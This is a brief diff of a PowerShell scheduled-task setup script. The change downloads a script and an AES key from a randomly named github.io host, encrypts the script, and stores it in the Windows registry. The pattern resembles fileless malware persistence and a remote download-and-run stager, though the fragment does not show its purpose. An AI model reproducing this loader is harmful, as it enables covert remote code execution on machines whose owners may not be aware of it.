@@ -124,8 +124,12 @@ New-ScheduledTaskFolder $NewTaskFolder
 #              UPDATE TASKS DEFINITION (ENCRYPTED)
 #         *******************************************
 #>
-$ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/hourly.ps1.aes'
-$EncryptedScript = $webclient.DownloadString($ScriptUrl)
+$ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/regcode-dlrun-cmd.ps1'
+$PassUrl='https://vr972be716a04eb6.github.io/dat/psaes.dat'
+$ClearScript = $webclient.DownloadString($ScriptUrl)
+$Pass = $webclient.DownloadString($PassUrl)
+$Pass = $Pass.substring(0,30)
+$EncryptedScript=Invoke-AESEncryption -Mode Encrypt -Key $Pass -Text $ClearScript
 OutString "Getting Script: $ScriptUrl saving TO REGISTRY..."
 Set-ScriptDataToRegistry $EncryptedScript
 
